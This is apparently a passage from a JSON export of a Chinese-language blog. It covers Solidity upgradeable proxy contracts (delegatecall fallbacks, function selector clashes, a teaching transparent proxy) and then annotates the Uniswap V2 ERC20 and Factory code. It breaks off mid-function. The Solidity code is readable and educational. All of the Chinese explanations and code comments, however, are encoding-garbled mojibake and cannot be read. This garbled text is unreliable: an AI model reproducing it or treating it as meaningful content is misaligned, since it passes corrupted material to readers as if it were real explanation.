0, calldatasize()) // åˆ©ç”¨delegatecallè°ƒç”¨implementationåˆçº¦ // delegatecallæ“ä½œç çš„å‚æ•°ï¼šgas, ç›®æ ‡åˆçº¦åœ°å€ï¼Œinput memèµ·å§‹ä½ç½®ï¼Œinput memé•¿åº¦ï¼Œoutput area memèµ·å§‹ä½ç½®ï¼Œoutput area memé•¿åº¦ // output areaèµ·å§‹ä½ç½®å’Œé•¿åº¦ä½ç½®ï¼Œæ‰€ä»¥è®¾ä¸º0 // delegatecallæˆåŠŸè¿”å›1ï¼Œå¤±è´¥è¿”å›0 let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) // å°†return dataæ‹·è´åˆ°å†…å­˜ // returndataæ“ä½œç çš„å‚æ•°ï¼šå†…å­˜èµ·å§‹ä½ç½®ï¼Œreturndataèµ·å§‹ä½ç½®ï¼Œreturndataé•¿åº¦ returndatacopy(0, 0, returndatasize()) switch result // å¦‚æœdelegate callå¤±è´¥ï¼Œrevert case 0 &#123; revert(0, returndatasize()) &#125; // å¦‚æœdelegate callæˆåŠŸï¼Œè¿”å›memèµ·å§‹ä½ç½®ä¸º0ï¼Œé•¿åº¦ä¸ºreturndatasize()çš„æ•°æ®ï¼ˆæ ¼å¼ä¸ºbytesï¼‰ default &#123; return(0, returndatasize()) &#125; &#125;&#125; è§£è¯»ï¼š åˆ†æ fallback()å‡½æ•° 123456789101112131415161718192021222324252627fallback() external payable &#123; address _implementation = implementation; assembly &#123; // å°†msg.dataæ‹·è´åˆ°å†…å­˜é‡Œ // calldatacopyæ“ä½œç çš„å‚æ•°: å†…å­˜èµ·å§‹ä½ç½®ï¼Œcalldataèµ·å§‹ä½ç½®ï¼Œcalldataé•¿åº¦ calldatacopy(0, 0, calldatasize()) // åˆ©ç”¨delegatecallè°ƒç”¨implementationåˆçº¦ // delegatecallæ“ä½œç çš„å‚æ•°ï¼šgas, ç›®æ ‡åˆçº¦åœ°å€ï¼Œinput memèµ·å§‹ä½ç½®ï¼Œinput memé•¿åº¦ï¼Œoutput area memèµ·å§‹ä½ç½®ï¼Œoutput area memé•¿åº¦ // output areaèµ·å§‹ä½ç½®å’Œé•¿åº¦ä½ç½®ï¼Œæ‰€ä»¥è®¾ä¸º0 // delegatecallæˆåŠŸè¿”å›1ï¼Œå¤±è´¥è¿”å›0 let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) // å°†return dataæ‹·è´åˆ°å†…å­˜ // returndataæ“ä½œç çš„å‚æ•°ï¼šå†…å­˜èµ·å§‹ä½ç½®ï¼Œreturndataèµ·å§‹ä½ç½®ï¼Œreturndataé•¿åº¦ returndatacopy(0, 0, returndatasize()) switch result // å¦‚æœdelegate callå¤±è´¥ï¼Œrevert case 0 &#123; revert(0, returndatasize()) &#125; // å¦‚æœdelegate callæˆåŠŸï¼Œè¿”å›memèµ·å§‹ä½ç½®ä¸º0ï¼Œé•¿åº¦ä¸ºreturndatasize()çš„æ•°æ®ï¼ˆæ ¼å¼ä¸ºbytesï¼‰ default &#123; return(0, returndatasize()) &#125; &#125; fallbackå‡½æ•°ç”¨äºå¤„ç†è°ƒç”¨è€…åœ¨è°ƒç”¨è¯¥åˆçº¦ä¸­ä¸å…·å¤‡çš„å‡½æ•°æ—¶è¢«è§¦å‘ã€‚å…¶ä¸­çš„ä»£ç é€»è¾‘æ˜¯ï¼šå†…è”æ±‡ç¼–å¤„ç†è°ƒç”¨è€…çš„msg.dataï¼Œé€šè¿‡è§£æ msg.dataè°ƒç”¨å…¶ä¸­åŒ…å«çš„å‡½æ•°ï¼Œæ¯”å¦‚æ­¤ä¾‹ä¸­ï¼Œmsg.dataä¾¿æ˜¯ å‡½æ•°increment()çš„é€‰æ‹©å™¨ï¼Œå®ƒæ˜¯ç”¨æ¥å”¯ä¸€è¯†åˆ«åˆçº¦ä¸­çš„å‡½æ•°ï¼Œåˆçº¦è°ƒç”¨å“ªä¸ªå‡½æ•°ç”±è°ƒç”¨è€…å†³å®šï¼Œå³ä½¿è¯¥åˆçº¦è¢«éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥é€šè¿‡ä¼ å…¥ä¸åŒçš„ä»£ç†é€»è¾‘åˆçº¦çš„åœ°å€ï¼Œå®ç°ä¸åŒçš„åŠŸèƒ½ã€‚ä»è€Œå®ç°åˆçº¦çš„å‡çº§ã€‚åˆç”±äºé‡‡ç”¨çš„æ˜¯ delegatecallçš„è°ƒç”¨æ–¹å¼ï¼Œä½¿å¾—å°†ä½œç”¨ç»“æœå‘ˆç°ç»™è°ƒç”¨è€…ã€‚ è¿™ä¸ªä»£ç†åˆçº¦ProxyçœŸçš„å¾ˆç‰›ï¼Œç‰¹åˆ«æ˜¯è¿™ä¸ªå†…è”æ±‡ç¼–çš„ä½¿ç”¨ï¼Œæå¤§çš„æé«˜äº†åˆçº¦çš„å…¼å®¹æ€§ï¼ï¼ï¼ Remixæ¼”ç¤ºé€æ˜ä»£ç† çŸ¥è¯†ç‚¹ï¼š å¦‚æœåœ¨ä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦ä¸­æœ‰ç›¸åŒçš„å‡½æ•°ï¼ˆé€‰æ‹©å™¨ç›¸åŒï¼‰ï¼Œä¸”ä»£ç†åˆçº¦é€šè¿‡ delegatecall å»è°ƒç”¨é€»è¾‘åˆçº¦ä¸­çš„ä¸ä»£ç†åˆçº¦ç›¸åŒçš„å‡½æ•°æ—¶ï¼Œä»£ç†åˆçº¦ä¼šä¼˜å…ˆè°ƒç”¨æœ¬åˆçº¦ä¸­çš„å‡½æ•°ã€‚ éªŒè¯å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031contract Proxy &#123; uint public result; address logic; constructor(address _logic) &#123; logic = _logic; &#125; function delegatecall() public &#123; result = 999; &#125; fallback() external &#123; (bool success, bytes memory data) = logic.delegatecall(msg.data); &#125;&#125;contract Logic &#123; uint public result; address proxy; // 0xbc957fda function delegatecall() public &#123; result = 666; &#125; function calSelector(string memory _funName) external pure returns(bytes4) &#123; return bytes4(abi.encodeWithSignature(_funName)); &#125;&#125; Proxy å’Œ Logic ä¸­éƒ½æœ‰ delegatecall å‡½æ•°ï¼Œé€šè¿‡Proxyå»è°ƒç”¨Logicä¸­çš„ delegatecall å½“ç„¶ ä½¿ç”¨ callæ¥è°ƒç”¨ä¹Ÿæ˜¯åŒç† 1. é€‰æ‹©å™¨å†²çªæ™ºèƒ½åˆçº¦ä¸­ï¼Œå‡½æ•°é€‰æ‹©å™¨ï¼ˆselectorï¼‰æ˜¯å‡½æ•°ç­¾åçš„å“ˆå¸Œçš„å‰4ä¸ªå­—èŠ‚ã€‚ä¾‹å¦‚mint(address account)çš„é€‰æ‹©å™¨ä¸ºbytes4(keccak256(&quot;mint(address)&quot;))ï¼Œä¹Ÿå°±æ˜¯0x6a627842ã€‚æ›´å¤šå…³äºé€‰æ‹©å™¨çš„å†…å®¹è§WTF Solidityæç®€æ•™ç¨‹ç¬¬29è®²ï¼šå‡½æ•°é€‰æ‹©å™¨ ç”±äºå‡½æ•°é€‰æ‹©å™¨ä»…æœ‰4ä¸ªå­—èŠ‚ï¼ŒèŒƒå›´å¾ˆå°ï¼Œå› æ­¤ä¸¤ä¸ªä¸åŒçš„å‡½æ•°å¯èƒ½ä¼šæœ‰ç›¸åŒçš„é€‰æ‹©å™¨ï¼Œä¾‹å¦‚ä¸‹é¢ä¸¤ä¸ªå‡½æ•°ï¼š 12345// é€‰æ‹©å™¨å†²çªçš„ä¾‹å­contract Foo &#123; function burn(uint256) external &#123;&#125; function collate_propagate_storage(bytes16) external &#123;&#125;&#125; ç¤ºä¾‹ä¸­ï¼Œå‡½æ•°burn()å’Œcollate_propagate_storage()çš„é€‰æ‹©å™¨éƒ½ä¸º0x42966c68ï¼Œæ˜¯ä¸€æ ·çš„ï¼Œè¿™ç§æƒ…å†µè¢«ç§°ä¸ºâ€œé€‰æ‹©å™¨å†²çªâ€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒEVMæ— æ³•é€šè¿‡å‡½æ•°é€‰æ‹©å™¨åˆ†è¾¨ç”¨æˆ·è°ƒç”¨å“ªä¸ªå‡½æ•°ï¼Œå› æ­¤è¯¥åˆçº¦æ— æ³•é€šè¿‡ç¼–è¯‘ã€‚ ç”±äºä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦æ˜¯ä¸¤ä¸ªåˆçº¦ï¼Œå°±ç®—ä»–ä»¬ä¹‹é—´å­˜åœ¨â€œé€‰æ‹©å™¨å†²çªâ€ä¹Ÿå¯ä»¥æ­£å¸¸ç¼–è¯‘ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å¾ˆä¸¥é‡çš„å®‰å…¨äº‹æ•…ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœé€»è¾‘åˆçº¦çš„aå‡½æ•°å’Œä»£ç†åˆçº¦çš„å‡çº§å‡½æ•°çš„é€‰æ‹©å™¨ç›¸åŒï¼Œé‚£ä¹ˆç®¡ç†äººå°±ä¼šåœ¨è°ƒç”¨aå‡½æ•°çš„æ—¶å€™ï¼Œå°†ä»£ç†åˆçº¦å‡çº§æˆä¸€ä¸ªé»‘æ´åˆçº¦ï¼Œåæœä¸å ªè®¾æƒ³ã€‚ å¦‚ä½•ç†è§£å‘¢ï¼Œå‡è®¾åœ¨æŸç§æƒ…å†µä¸‹ï¼ŒPrxoyä¸­çš„ upgradeå‡½æ•°çš„ é€‰æ‹©å™¨ abi.encodeWithSignature(upgrade(address))çš„å€¼ï¼Œå’Œ msg.dataçš„å€¼ç›¸åŒçš„è¯ï¼Œå‡½æ•°åˆ™ä¼šé€‰æ‹©è°ƒç”¨upgradeå‡½æ•°ï¼Œè€Œä¸ä¼šæ‰§è¡Œ msg.dataä¸­çš„å‡½æ•°ã€‚å¦‚è‹¥åœ¨ msg.dataä¸­åŒ…å«äº†å‚æ•°ï¼Œä¸”è¯¥å‚æ•°æ˜¯åœ°å€ç±»å‹ï¼Œæ‰§è¡Œ(bool success, bytes memory data) = implementation.delegatecall(msg.data);åˆ™ä¼šå°†åˆçº¦ä¸­çš„é€»è¾‘åˆçº¦çš„åœ°å€ç»™ä¿®æ”¹ï¼Œä»è€Œå¯¼è‡´åˆçº¦æŸåã€‚ ç›®å‰ï¼Œæœ‰ä¸¤ä¸ªå¯å‡çº§åˆçº¦æ ‡å‡†è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼šé€æ˜ä»£ç†Transparent Proxyå’Œé€šç”¨å¯å‡çº§ä»£ç†UUPS 2. é€æ˜ä»£ç†æ¦‚å¿µé€æ˜ä»£ç†çš„é€»è¾‘éå¸¸ç®€å•ï¼šç®¡ç†å‘˜å¯èƒ½ä¼šå› ä¸ºâ€œå‡½æ•°é€‰æ‹©å™¨å†²çªâ€ï¼Œåœ¨è°ƒç”¨é€»è¾‘åˆçº¦çš„å‡½æ•°æ—¶ï¼Œè¯¯è°ƒç”¨ä»£ç†åˆçº¦çš„å¯å‡çº§å‡½æ•°ã€‚é‚£ä¹ˆé™åˆ¶ç®¡ç†å‘˜çš„æƒé™ï¼Œä¸è®©ä»–è°ƒç”¨ä»»ä½•é€»è¾‘åˆçº¦çš„å‡½æ•°ï¼Œå°±èƒ½è§£å†³å†²çªï¼š ç®¡ç†å‘˜å˜ä¸ºå·¥å…·äººï¼Œä»…èƒ½è°ƒç”¨ä»£ç†åˆçº¦çš„å¯å‡çº§å‡½æ•°å¯¹åˆçº¦å‡çº§ï¼Œä¸èƒ½é€šè¿‡å›è°ƒå‡½æ•°è°ƒç”¨é€»è¾‘åˆçº¦ã€‚ å…¶å®ƒç”¨æˆ·ä¸èƒ½è°ƒç”¨å¯å‡çº§å‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥è°ƒç”¨é€»è¾‘åˆçº¦çš„å‡½æ•°ã€‚ 3. ä»£ç†åˆçº¦è¿™é‡Œçš„ä»£ç†åˆçº¦å’Œç¬¬47è®²çš„éå¸¸ç›¸è¿‘ï¼Œåªæ˜¯fallback()å‡½æ•°é™åˆ¶äº†ç®¡ç†å‘˜åœ°å€çš„è°ƒç”¨ã€‚ å®ƒåŒ…å«3ä¸ªå˜é‡ï¼š implementationï¼šé€»è¾‘åˆçº¦åœ°å€ã€‚ adminï¼šadminåœ°å€ã€‚ wordsï¼šå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„å‡½æ•°æ”¹å˜ã€‚ å®ƒåŒ…å«3ä¸ªå‡½æ•° æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–adminå’Œé€»è¾‘åˆçº¦åœ°å€ã€‚ fallback()ï¼šå›è°ƒå‡½æ•°ï¼Œå°†è°ƒç”¨å§”æ‰˜ç»™é€»è¾‘åˆçº¦ï¼Œä¸èƒ½ç”±adminè°ƒç”¨ã€‚ upgrade()ï¼šå‡çº§å‡½æ•°ï¼Œæ”¹å˜é€»è¾‘åˆçº¦åœ°å€ï¼Œåªèƒ½ç”±adminè°ƒç”¨ã€‚ 12345678910111213141516171819202122232425// é€æ˜å¯å‡çº§åˆçº¦çš„æ•™å­¦ä»£ç ï¼Œä¸è¦ç”¨äºç”Ÿäº§ã€‚contract TransparentProxy &#123; address implementation; // logicåˆçº¦åœ°å€ address admin; // ç®¡ç†å‘˜ string public words; // å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„å‡½æ•°æ”¹å˜ // æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–adminå’Œé€»è¾‘åˆçº¦åœ°å€ constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallbackå‡½æ•°ï¼Œå°†è°ƒç”¨å§”æ‰˜ç»™é€»è¾‘åˆçº¦ // ä¸èƒ½è¢«adminè°ƒç”¨ï¼Œé¿å…é€‰æ‹©å™¨å†²çªå¼•å‘æ„å¤– fallback() external payable &#123; require(msg.sender != admin); (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // å‡çº§å‡½æ•°ï¼Œæ”¹å˜é€»è¾‘åˆçº¦åœ°å€ï¼Œåªèƒ½ç”±adminè°ƒç”¨ function upgrade(address newImplementation) external &#123; if (msg.sender != admin) revert(); implementation = newImplementation; &#125;&#125; 4. é€»è¾‘åˆçº¦è¿™é‡Œçš„æ–°ã€æ—§é€»è¾‘åˆçº¦ä¸ç¬¬47è®²ä¸€æ ·ã€‚é€»è¾‘åˆçº¦åŒ…å«3ä¸ªçŠ¶æ€å˜é‡ï¼Œä¸ä¿æŒä»£ç†åˆçº¦ä¸€è‡´ï¼Œé˜²æ­¢æ’æ§½å†²çªï¼›åŒ…å«ä¸€ä¸ªå‡½æ•°foo()ï¼Œæ—§é€»è¾‘åˆçº¦ä¼šå°†wordsçš„å€¼æ”¹ä¸º&quot;old&quot;ï¼Œæ–°çš„ä¼šæ”¹ä¸º&quot;new&quot;ã€‚ 12345678910111213141516171819202122232425// æ—§é€»è¾‘åˆçº¦contract Logic1 &#123; // çŠ¶æ€å˜é‡å’Œproxyåˆçº¦ä¸€è‡´ï¼Œé˜²æ­¢æ’æ§½å†²çª address public implementation; address public admin; string public words; // å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„å‡½æ•°æ”¹å˜ // æ”¹å˜proxyä¸­çŠ¶æ€å˜é‡ï¼Œé€‰æ‹©å™¨ï¼š 0xc2985578 function foo() public&#123; words = &quot;old&quot;; &#125;&#125;// æ–°é€»è¾‘åˆçº¦contract Logic2 &#123; // çŠ¶æ€å˜é‡å’Œproxyåˆçº¦ä¸€è‡´ï¼Œé˜²æ­¢æ’æ§½å†²çª address public implementation; address public admin; string public words; // å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡é€»è¾‘åˆçº¦çš„å‡½æ•°æ”¹å˜ // æ”¹å˜proxyä¸­çŠ¶æ€å˜é‡ï¼Œé€‰æ‹©å™¨ï¼š0xc2985578 function foo() public&#123; words = &quot;new&quot;; &#125;&#125; Remixå®ç°æ·±åº¦å­¦ä¹ link å‚è€ƒåšå®¢WTFproxyContract","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"Proxy","slug":"DEFI/Proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/Proxy/"}],"tags":[{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"},{"name":"Transparent","slug":"Transparent","permalink":"https://biyouqiuqiu.com/tags/Transparent/"}]},{"title":"uniswap v2","slug":"DEFI/uniswap/uniswap-v2","date":"2023-07-17T05:47:10.000Z","updated":"2023-07-17T05:47:10.000Z","comments":true,"path":"2023/07/17/DEFI/uniswap/uniswap-v2/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/17/DEFI/uniswap/uniswap-v2/","excerpt":"","text":"å‰è¨€ï¼šUniswap V2ä»£ç ç»“æ„ Uniswapæ™ºèƒ½åˆçº¦ä»£ç ç”±ä¸¤ä¸ªgithubé¡¹ç›®ç»„æˆã€‚ä¸€ä¸ªæ˜¯coreï¼Œä¸€ä¸ªæ˜¯peripheryã€‚ https://github.com/Uniswap/uniswap-v2-core.git https://github.com/Uniswap/uniswap-v2-periphery.git coreåæ ¸å¿ƒé€»è¾‘ï¼Œå•ä¸ªswapçš„é€»è¾‘ã€‚peripheryåå¤–å›´æœåŠ¡ï¼Œä¸€ä¸ªä¸ªswapçš„åŸºç¡€ä¸Šæ„å»ºæœåŠ¡ã€‚å•ä¸ªswapï¼Œä¸¤ç§ä»£å¸å½¢æˆçš„äº¤æ˜“å¯¹ï¼Œä¿—ç§°â€œæ± å­â€ã€‚æ¯ä¸ªäº¤æ˜“å¯¹æœ‰ä¸€äº›åŸºæœ¬å±æ€§ï¼šreserve0&#x2F;reserve1ä»¥åŠtotal supplyã€‚reserve0&#x2F;reserve1æ˜¯äº¤æ˜“å¯¹çš„ä¸¤ç§ä»£å¸çš„å‚¨å­˜é‡ã€‚total supplyæ˜¯å½“å‰æµåŠ¨æ€§ä»£å¸çš„æ€»é‡ã€‚æ¯ä¸ªäº¤æ˜“å¯¹éƒ½å¯¹åº”ä¸€ä¸ªæµåŠ¨æ€§ä»£å¸ï¼ˆLPT - liquidity provider tokenï¼‰ã€‚ç®€å•çš„è¯´ï¼ŒLPTè®°å½•äº†æ‰€æœ‰æµåŠ¨æ€§æä¾›è€…çš„è´¡çŒ®ã€‚æ‰€æœ‰æµåŠ¨æ€§ä»£å¸çš„æ€»å’Œå°±æ˜¯total supplyã€‚Uniswapåè®®çš„æ€æƒ³æ˜¯reserve0*reserve1çš„ä¹˜ç§¯ä¸å˜ã€‚ Peripheryé€»è¾‘ æ ¸å¿ƒé€»è¾‘å®ç°åœ¨UniswapV2Router02.solä¸­ã€‚ç§°ä¸ºRouterï¼Œå› ä¸ºPeripheryå®ç°äº†â€œè·¯ç”±â€ï¼Œæ”¯æŒå„ä¸ªswapä¹‹é—´çš„è¿æ¥ã€‚åŸºæœ¬ä¸Šå®ç°äº†ä¸‰ä¸ªåŠŸèƒ½ï¼š1&#x2F; add liquidityï¼ˆå¢åŠ æµåŠ¨æ€§ï¼‰2&#x2F;remove liqudity (æŠ½å–æµåŠ¨æ€§) 3&#x2F; swapï¼ˆäº¤æ¢ï¼‰ã€‚ uniswap v2éå¸¸é‡è¦ï¼Œå¿…é¡»è¦éå¸¸ç†Ÿæ‚‰è¯¥åè®®ï¼ï¼ï¼ ä»¥ä¸‹ä¾¿æ˜¯å¯¹uniswap v2 ä»£ç çš„è§£è¯»ã€‚ v2-core1. UniswapV2ERC20uniswap v2çš„ä»£å¸å®é™…ä¸Šæ˜¯ ERC20ä»£å¸ã€‚å®ç°ERC20æ ‡å‡†æ–¹æ³•ã€‚ ä»£ç è§£è¯»å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2ERC20.sol&#x27;;import &#x27;./libraries/SafeMath.sol&#x27;;contract UniswapV2ERC20 is IUniswapV2ERC20 &#123; using SafeMath for uint; // å°† SafeMath åº“åˆçº¦ç”¨äº uint ç±»å‹ string public constant name = &#x27;Uniswap V2&#x27;; // ä»£å¸çš„åå­— string public constant symbol = &#x27;UNI-V2&#x27;; // ä»£å¸ç¬¦å· uint8 public constant decimals = 18; uint public totalSupply; // å‘è¡Œé‡ // å­˜å‚¨æŸåœ°å€çš„ä»£å¸ä½™é¢ï¼Œaddress =&gt; uintçš„æ˜ å°„ mapping(address =&gt; uint) public balanceOf; // å­˜å‚¨æŸä¸€åœ°å€å¯¹å¦ä¸€åœ°å€çš„ä»£å¸æˆæƒé‡ï¼Œæˆæƒä¹‹åå¯ä»¥å…è®¸è¢«æˆæƒäººä½¿ç”¨æˆæƒäººçš„ä»£å¸è¿›è¡Œè½¬è´¦ `transferFrom` mapping(address =&gt; mapping(address =&gt; uint)) public allowance; // bytes32 public DOMAIN_SEPARATOR; // keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;); bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; // mapping(address =&gt; uint) public nonces; // ä¸¤ä¸ªåœ¨æˆæƒå’Œè½¬è´¦æ—¶ä¼šè¢«è§¦å‘çš„äº‹ä»¶ event Approval(address indexed owner, address indexed spender, uint value); event Transfer(address indexed from, address indexed to, uint value); constructor() public &#123; uint chainId; assembly &#123; // chainidæŒ‡ä»¤ç”¨äºè·å–å½“å‰åŒºå—é“¾çš„é“¾ID, å®ƒå”¯ä¸€åœ°æ ‡è¯†äº†å½“å‰åŒºå—é“¾çš„ç½‘ç»œ chainId := chainid &#125; // åˆå§‹åŒ– DOMAIN_SEPARATOR å˜é‡ DOMAIN_SEPARATOR = keccak256( abi.encode( keccak256(&#x27;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&#x27;), keccak256(bytes(name)), keccak256(bytes(&#x27;1&#x27;)), chainId, address(this) ) ); &#125; /** 1. é“¸å¸æ“ä½œï¼Œå› ä¸ºæœ‰åº“å‡½æ•°çš„å¼•ç”¨ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ add,subç­‰è¿ç®— 2. totalSupply å‘è¡Œé‡æ—¶å¯¹äºæ•´ä¸ªç³»ç»Ÿæ¥è¯´ï¼Œè€Œbalanceæ˜¯å¯¹äºæŸä¸ªè´¦æˆ·æ¥è¯´ */ function _mint(address to, uint value) internal &#123; totalSupply = totalSupply.add(value); // å‘è¡Œé‡ç´¯åŠ  value balanceOf[to] = balanceOf[to].add(value); // toè´¦æˆ·çš„ ä½™é¢ç´¯åŠ  value emit Transfer(address(0), to, value); // è§¦å‘äº¤æ˜“äº‹ä»¶ &#125; /** 1. é”€å¸æ“ä½œ */ function _burn(address from, uint value) internal &#123; balanceOf[from] = balanceOf[from].sub(value); // from è´¦æˆ·çš„ ä½™é¢ç´¯å‡ value totalSupply = totalSupply.sub(value); // å‘è¡Œé‡ç´¯å‡ value emit Transfer(from, address(0), value); // è§¦å‘äº¤æ˜“äº‹ä»¶ &#125; /** 1. æˆæƒæ“ä½œ 2. ownerä¸€èˆ¬æ˜¯è°ƒç”¨è€…ï¼Œspenderåˆ™æ˜¯æˆæƒè€…ï¼Œvalueæ˜¯æˆæƒä»£å¸é‡ */ function _approve(address owner, address spender, uint value) private &#123; // è®°å½•owner å¯¹spender çš„æˆæƒé‡ä¸º value allowance[owner][spender] = value; emit Approval(owner, spender, value); // è§¦å‘æˆæƒäº‹ä»¶ &#125; /** 1. è½¬è´¦æ“ä½œ 2. å†…ç½®å‡½æ•°_transfer(), fromè´¦æˆ·å‘toè´¦æˆ·è½¬ç§» valueçš„ä»£å¸ 3. è€Œåœ¨å¤–éƒ¨å‡½æ•°ä¸­ï¼Œtransferä¸­çš„fromä¸ºåˆçº¦è°ƒç”¨è€… */ function _transfer(address from, address to, uint value) private &#123; // from è´¦æˆ·ä½™é¢å‡å°‘value balanceOf[from] = balanceOf[from].sub(value); // to è´¦æˆ·ä½™é¢å¢åŠ  value balanceOf[to] = balanceOf[to].add(value); emit Transfer(from, to, value); &#125; /** 1. å¤–éƒ¨æˆæƒæ“ä½œ 2. å¤–éƒ¨æˆæƒè§„å®šäº†æˆæƒè€…æ˜¯è°ƒç”¨è€…ï¼Œäºˆä»¥ï¼š&#x27;æˆ‘&#x27;ç»™spenderæˆæƒ */ function approve(address spender, uint value) external returns (bool) &#123; _approve(msg.sender, spender, value); return true; &#125; /** 1. å¤–éƒ¨è½¬è´¦æ“ä½œ 2. è§„å®šäº†è½¬è´¦è€…æ˜¯è°ƒç”¨è€…ï¼Œäºˆä»¥ï¼š&#x27;æˆ‘&#x27;ç»™toè½¬è´¦value */ function transfer(address to, uint value) external returns (bool) &#123; _transfer(msg.sender, to, value); return true; &#125; /** 1. å¤–éƒ¨è½¬è´¦æ“ä½œï¼Œmsg.senderæ˜¯ä»£ç†äºº 2. åœ¨ pragma=0.5.16çš„ç‰ˆæœ¬ä¸­ï¼Œuint(-1)= 115792089237316195423570985008687907853269984665640564039457584007913129639935 3. è¦è°ƒç”¨è¯¥å‡½æ•°ï¼Œäº‹å…ˆè¦è®© fromæ‰§è¡Œapproveå‡½æ•°ï¼Œç»™msg.senderæˆæƒ 4. æœ€åè°ƒç”¨_transfer()å‡½æ•°ï¼Œæ‰§è¡Œfrom å‘ to è½¬è´¦ valueçš„æ“ä½œ */ function transferFrom(address from, address to, uint value) external returns (bool) &#123; if (allowance[from][msg.sender] != uint(-1)) &#123; allowance[from][msg.sender] = allowance[from][msg.sender].sub(value); &#125; _transfer(from, to, value); return true; &#125; /** 1. è®¸å¯æ“ä½œ 2. permitå‡½æ•°çš„ä½œç”¨æ˜¯å°†ä»£å¸æˆæƒç»™æŒ‡å®šçš„ç›®æ ‡åœ°å€ï¼Œ ä½¿å¾—ç›®æ ‡åœ°å€å¯ä»¥ä»£è¡¨ä»£å¸æŒæœ‰äººè¿›è¡Œäº¤æ˜“ï¼Œè€Œæ— éœ€è¿›è¡Œä¼ ç»Ÿçš„æˆæƒäº¤æ˜“ã€‚ è¿™ç§æ–°å‹çš„æˆæƒæ–¹æ³•å¯ä»¥æé«˜ä»£å¸äº¤æ˜“çš„æ•ˆç‡å’Œå®‰å…¨æ€§ï¼Œ åŒæ—¶ä¹Ÿå¯ä»¥å‡å°‘äº¤æ˜“çš„æˆæœ¬å’Œæ—¶é—´ã€‚ 3. owneræˆæƒè€…ï¼Œspenderè¢«æˆæƒè€…ï¼Œvalueä»£å¸æ•°ç›®ï¼Œdeadlineï¼šæˆæƒçš„æˆªæ­¢æ—¶é—´ï¼Œå¿…é¡»åœ¨æ­¤æ—¶é—´ä¹‹å‰å®Œæˆæˆæƒ nonceï¼šéšæœºæ•°ï¼Œç”¨äºé¿å…æˆæƒè¢«é‡å¤ä½¿ç”¨ï¼Œvã€rã€sï¼šç”¨äºéªŒè¯æˆæƒçš„ç­¾åå‚æ•°ã€‚ */ function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123; require(deadline &gt;= block.timestamp, &#x27;UniswapV2: EXPIRED&#x27;); bytes32 digest = keccak256( abi.encodePacked( &#x27;\\x19\\x01&#x27;, DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)) ) ); address recoveredAddress = ecrecover(digest, v, r, s); require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;); _approve(owner, spender, value); &#125;&#125; 2. UniswapV2Factoryå·¥å‚åˆçº¦ï¼Œç”¨äºåˆ›å»ºPairåˆçº¦ï¼ˆä»¥åŠè®¾ç½®åè®®æ‰‹ç»­è´¹æ¥æ”¶åœ°å€ï¼‰ ä»£ç è§£è¯»å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./UniswapV2Pair.sol&#x27;;contract UniswapV2Factory is IUniswapV2Factory &#123; address public feeTo; // æ‰‹ç»­è´¹æ¥æ”¶åœ°å€ address public feeToSetter; // æ‰‹ç»­è´¹æ¥æ”¶åœ°å€çš„è®¾ç½®è€… /** å¦‚æœå°† getPairè®¾ç½®ä¸ºpublicï¼Œåˆ™ç¼–è¯‘çš„æ—¶å€™ä¼šåœ¨è¯¥åˆçº¦ä¸­é»˜è®¤ç”Ÿæˆset å’Œgetå‡½æ•° è§£è¯»ï¼šé€šè¿‡ä¸¤ä¸ªåœ°å€è·å–åˆ°äº¤æ˜“å¯¹åœ°å€ */ mapping(address =&gt; mapping(address =&gt; address)) public getPair; // æ•°ç»„ï¼Œå­˜å‚¨æ‰€æœ‰äº¤æ˜“å¯¹ address[] public allPairs; // äº¤æ˜“å¯¹åˆ›å»ºäº‹ä»¶ event PairCreated(address indexed token0, address indexed token1, address pair, uint); // åˆå§‹åŒ–ï¼Œæ‰‹ç»­è´¹æ¥æ”¶åœ°å€çš„è®¾ç½®è€… constructor(address _feeToSetter) public &#123; feeToSetter = _feeToSetter; &#125; // è·å–äº¤æ˜“å¯¹çš„å¯¹æ•° function 